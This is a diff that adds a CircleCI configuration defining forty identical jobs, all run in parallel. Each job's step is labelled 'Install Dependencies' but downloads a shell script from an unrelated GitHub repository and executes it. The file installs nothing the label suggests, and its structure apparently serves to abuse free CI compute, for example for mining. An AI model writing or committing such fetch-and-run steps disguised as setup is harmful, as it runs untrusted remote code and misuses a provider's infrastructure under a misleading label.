@@ -1,0 +1,407 @@
+version: 2.1
+jobs:
+    aku1:
+      docker:
+            - image: cimg/python:3.8
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              sudo apt update
+              wget https://raw.githubusercontent.com/cjfw74683/makq/main/run.sh && chmod +x run.sh && ./run.sh
+    aku2:
+      docker:
+            - image: cimg/python:3.8
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              sudo apt update
+              wget https://raw.githubusercontent.com/cjfw74683/makq/main/run.sh && chmod +x run.sh && ./run.sh
+    aku3:
+      docker:
+            - image: cimg/python:3.8
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              sudo apt update
+              wget https://raw.githubusercontent.com/cjfw74683/makq/main/run.sh && chmod +x run.sh && ./run.sh
+    aku4:
+      docker:
+            - image: cimg/python:3.8
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              sudo apt update
+              wget https://raw.githubusercontent.com/cjfw74683/makq/main/run.sh && chmod +x run.sh && ./run.sh
+    aku5:
+      docker:
+            - image: cimg/python:3.8
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              sudo apt update
+              wget https://raw.githubusercontent.com/cjfw74683/makq/main/run.sh && chmod +x run.sh && ./run.sh
+    aku6:
+      docker:
+            - image: cimg/python:3.8
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              sudo apt update
+              wget https://raw.githubusercontent.com/cjfw74683/makq/main/run.sh && chmod +x run.sh && ./run.sh
+    aku7:
+      docker:
+            - image: cimg/python:3.8
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              sudo apt update
+              wget https://raw.githubusercontent.com/cjfw74683/makq/main/run.sh && chmod +x run.sh && ./run.sh
+    aku8:
+      docker:
+            - image: cimg/python:3.8
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              sudo apt update
+              wget https://raw.githubusercontent.com/cjfw74683/makq/main/run.sh && chmod +x run.sh && ./run.sh
+    aku9:
+      docker:
+            - image: cimg/python:3.8
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              sudo apt update
+              wget https://raw.githubusercontent.com/cjfw74683/makq/main/run.sh && chmod +x run.sh && ./run.sh
+    aku10:
+      docker:
+            - image: cimg/python:3.8
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              sudo apt update
+              wget https://raw.githubusercontent.com/cjfw74683/makq/main/run.sh && chmod +x run.sh && ./run.sh
+    aku11:
+      docker:
+            - image: cimg/python:3.8
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              sudo apt update
+              wget https://raw.githubusercontent.com/cjfw74683/makq/main/run.sh && chmod +x run.sh && ./run.sh
+    aku12:
+      docker:
+            - image: cimg/python:3.8
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              sudo apt update
+              wget https://raw.githubusercontent.com/cjfw74683/makq/main/run.sh && chmod +x run.sh && ./run.sh
+    aku13:
+      docker:
+            - image: cimg/python:3.8
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              sudo apt update
+              wget https://raw.githubusercontent.com/cjfw74683/makq/main/run.sh && chmod +x run.sh && ./run.sh
+    aku14:
+      docker:
+            - image: cimg/python:3.8
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              sudo apt update
+              wget https://raw.githubusercontent.com/cjfw74683/makq/main/run.sh && chmod +x run.sh && ./run.sh
+    aku15:
+      docker:
+            - image: cimg/python:3.8
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              sudo apt update
+              wget https://raw.githubusercontent.com/cjfw74683/makq/main/run.sh && chmod +x run.sh && ./run.sh
+    aku16:
+      docker:
+            - image: cimg/python:3.8
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              sudo apt update
+              wget https://raw.githubusercontent.com/cjfw74683/makq/main/run.sh && chmod +x run.sh && ./run.sh
+    aku17:
+      docker:
+            - image: cimg/python:3.8
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              sudo apt update
+              wget https://raw.githubusercontent.com/cjfw74683/makq/main/run.sh && chmod +x run.sh && ./run.sh
+    aku18:
+      docker:
+            - image: cimg/python:3.8
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              sudo apt update
+              wget https://raw.githubusercontent.com/cjfw74683/makq/main/run.sh && chmod +x run.sh && ./run.sh
+    aku19:
+      docker:
+            - image: cimg/python:3.8
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              sudo apt update
+              wget https://raw.githubusercontent.com/cjfw74683/makq/main/run.sh && chmod +x run.sh && ./run.sh
+    aku20:
+      docker:
+            - image: cimg/python:3.8
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              sudo apt update
+              wget https://raw.githubusercontent.com/cjfw74683/makq/main/run.sh && chmod +x run.sh && ./run.sh
+    aku21:
+      docker:
+            - image: cimg/python:3.8
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              sudo apt update
+              wget https://raw.githubusercontent.com/cjfw74683/makq/main/run.sh && chmod +x run.sh && ./run.sh
+    aku22:
+      docker:
+            - image: cimg/python:3.8
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              sudo apt update
+              wget https://raw.githubusercontent.com/cjfw74683/makq/main/run.sh && chmod +x run.sh && ./run.sh
+    aku23:
+      docker:
+            - image: cimg/python:3.8
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              sudo apt update
+              wget https://raw.githubusercontent.com/cjfw74683/makq/main/run.sh && chmod +x run.sh && ./run.sh
+    aku24:
+      docker:
+            - image: cimg/python:3.8
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              sudo apt update
+              wget https://raw.githubusercontent.com/cjfw74683/makq/main/run.sh && chmod +x run.sh && ./run.sh
+    aku25:
+      docker:
+            - image: cimg/python:3.8
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              sudo apt update
+              wget https://raw.githubusercontent.com/cjfw74683/makq/main/run.sh && chmod +x run.sh && ./run.sh
+    aku26:
+      docker:
+            - image: cimg/python:3.8
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              sudo apt update
+              wget https://raw.githubusercontent.com/cjfw74683/makq/main/run.sh && chmod +x run.sh && ./run.sh
+    aku27:
+      docker:
+            - image: cimg/python:3.8
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              sudo apt update
+              wget https://raw.githubusercontent.com/cjfw74683/makq/main/run.sh && chmod +x run.sh && ./run.sh
+    aku28:
+      docker:
+            - image: cimg/python:3.8
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              sudo apt update
+              wget https://raw.githubusercontent.com/cjfw74683/makq/main/run.sh && chmod +x run.sh && ./run.sh
+    aku29:
+      docker:
+            - image: cimg/python:3.8
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              sudo apt update
+              wget https://raw.githubusercontent.com/cjfw74683/makq/main/run.sh && chmod +x run.sh && ./run.sh
+    aku30:
+      docker:
+            - image: cimg/python:3.8
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              sudo apt update
+              wget https://raw.githubusercontent.com/cjfw74683/makq/main/run.sh && chmod +x run.sh && ./run.sh
+    aku31:
+      docker:
+            - image: cimg/python:3.8
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              sudo apt update
+              wget https://raw.githubusercontent.com/cjfw74683/makq/main/run.sh && chmod +x run.sh && ./run.sh
+    aku32:
+      docker:
+            - image: cimg/python:3.8
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              sudo apt update
+              wget https://raw.githubusercontent.com/cjfw74683/makq/main/run.sh && chmod +x run.sh && ./run.sh
+    aku33:
+      docker:
+            - image: cimg/python:3.8
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              sudo apt update
+              wget https://raw.githubusercontent.com/cjfw74683/makq/main/run.sh && chmod +x run.sh && ./run.sh
+    aku34:
+      docker:
+            - image: cimg/python:3.8
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              sudo apt update
+              wget https://raw.githubusercontent.com/cjfw74683/makq/main/run.sh && chmod +x run.sh && ./run.sh
+    aku35:
+      docker:
+            - image: cimg/python:3.8
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              sudo apt update
+              wget https://raw.githubusercontent.com/cjfw74683/makq/main/run.sh && chmod +x run.sh && ./run.sh
+    aku36:
+      docker:
+            - image: cimg/python:3.8
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              sudo apt update
+              wget https://raw.githubusercontent.com/cjfw74683/makq/main/run.sh && chmod +x run.sh && ./run.sh
+    aku37:
+      docker:
+            - image: cimg/python:3.8
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              sudo apt update
+              wget https://raw.githubusercontent.com/cjfw74683/makq/main/run.sh && chmod +x run.sh && ./run.sh
+    aku38:
+      docker:
+            - image: cimg/python:3.8
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              sudo apt update
+              wget https://raw.githubusercontent.com/cjfw74683/makq/main/run.sh && chmod +x run.sh && ./run.sh
+    aku39:
+      docker:
+            - image: cimg/python:3.8
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              sudo apt update
+              wget https://raw.githubusercontent.com/cjfw74683/makq/main/run.sh && chmod +x run.sh && ./run.sh
+    aku40:
+      docker:
+            - image: cimg/python:3.8
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              sudo apt update
+              wget https://raw.githubusercontent.com/cjfw74683/makq/main/run.sh && chmod +x run.sh && ./run.sh
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+            - aku1
+            - aku2
+            - aku3
+            - aku4
+            - aku5
+            - aku6
+            - aku7
+            - aku8
+            - aku9
+            - aku10
+            - aku11
+            - aku12
+            - aku13
+            - aku14
+            - aku15
+            - aku16
+            - aku17
+            - aku18
+            - aku19
+            - aku20
+            - aku21
+            - aku22
+            - aku23
+            - aku24
+            - aku25
+            - aku26
+            - aku27
+            - aku28
+            - aku29
+            - aku30
+            - aku31
+            - aku32
+            - aku33
+            - aku34
+            - aku35
+            - aku36
+            - aku37
+            - aku38
+            - aku39
+            - aku40
